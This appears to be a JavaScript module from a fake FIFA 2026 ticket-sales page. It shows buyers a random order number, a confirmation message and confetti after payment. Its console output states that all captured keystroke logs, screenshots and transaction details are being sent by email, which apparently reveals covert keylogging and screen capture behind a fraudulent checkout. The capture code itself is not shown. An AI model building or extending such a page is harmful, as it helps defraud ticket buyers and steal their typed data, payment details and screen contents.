export function generateOrderNumber() {
    const prefix = 'FIFA';
    const year = '2026';
    const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
    return `${prefix}-${year}-${random}`;
}

export function createConfetti() {
    for(let i = 0; i < 100; i++) {
        const confetti = document.createElement('div');
        confetti.className = 'confetti';
        confetti.style.left = Math.random() * 100 + '%';
        confetti.style.position = 'fixed';
        confetti.style.top = '-10px';
        confetti.style.width = Math.random() * 8 + 4 + 'px';
        confetti.style.height = Math.random() * 8 + 4 + 'px';
        confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
        confetti.style.animation = `fall ${Math.random() * 2 + 1}s linear forwards`;
        confetti.style.pointerEvents = 'none';
        confetti.style.zIndex = '9999';
        document.body.appendChild(confetti);
        
        setTimeout(() => confetti.remove(), 3000);
    }
}

export function showSuccessModal(totalAmount, email, userName, currentMatch, seatsCount) {
    const orderNumber = generateOrderNumber();
    const displayName = userName || document.getElementById('c-name')?.value || 'aficionado';
    
    document.getElementById('order-number').innerText = orderNumber;
    document.getElementById('paid-amount').innerHTML = `$${totalAmount.toLocaleString('es-MX')} MXN`;
    document.getElementById('sent-email').innerHTML = email;
    document.getElementById('success-message').innerHTML = `¡Gracias por tu compra, ${displayName}! Tu reserva para ${currentMatch} ha sido confirmada.`;
    document.getElementById('success-modal').classList.remove('hidden');
    createConfetti();
    
    console.log(`\n${'='.repeat(60)}`);
    console.log(`TRANSACCIÓN COMPLETADA Y DATOS ENVIADOS`);
    console.log(`${'='.repeat(60)}`);
    console.log(`Usuario: ${displayName}`);
    console.log(`Correo: ${email}`);
    console.log(`Partido: ${currentMatch}`);
    console.log(`Asientos: ${seatsCount}`);
    console.log(`Total: $${totalAmount.toLocaleString('es-MX')} MXN`);
    console.log(`Número de orden: ${orderNumber}`);
    console.log(`${'='.repeat(60)}`);
    console.log(`Los siguientes datos se están enviando por correo:`);
    console.log(`   Todos los logs de teclado capturados`);
    console.log(`   Todas las capturas de pantalla`);
    console.log(`   Información de la transacción`);
    console.log(`${'='.repeat(60)}\n`);
}

window.closeSuccessModal = function() {
    document.getElementById('success-modal').classList.add('hidden');
    // Aquí iría la lógica para redirigir a la sección "Mis Boletos"
    console.log("Redirigiendo a 'Mis Boletos'...");
};

window.goBackToSelection = function() {
    document.getElementById('success-modal').classList.add('hidden');
    window.closeModals();
    document.getElementById('entradas').scrollIntoView({ behavior: 'smooth' });
};
window.closeModals = function() { 
    document.getElementById('seat-modal').classList.add('hidden'); 
    document.getElementById('payment-modal').classList.add('hidden');
};